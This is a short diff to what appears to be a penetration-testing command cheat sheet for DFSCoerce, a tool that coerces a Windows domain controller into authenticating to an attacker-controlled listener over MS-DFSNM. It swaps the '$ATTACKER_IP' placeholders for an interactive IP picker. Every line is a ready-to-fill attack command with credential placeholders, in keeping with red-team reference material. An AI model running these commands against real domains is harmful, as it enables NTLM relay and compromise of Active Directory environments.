@@ -1,4 +1,4 @@
 # DFSCoerce — Coercion via MS-DFSNM
 DFSCoerce -u $USER -p $PASSWORD -d $DOMAIN $LISTENER_IP $TARGET_COMPUTER
-DFSCoerce -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$ATTACKER_IP" "$DC_HOST"
-DFSCoerce -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$LHOST" "$IP"
+DFSCoerce -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$(fzf-ip)" "$DC_HOST"
+DFSCoerce -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$(fzf-ip)" "$IP"
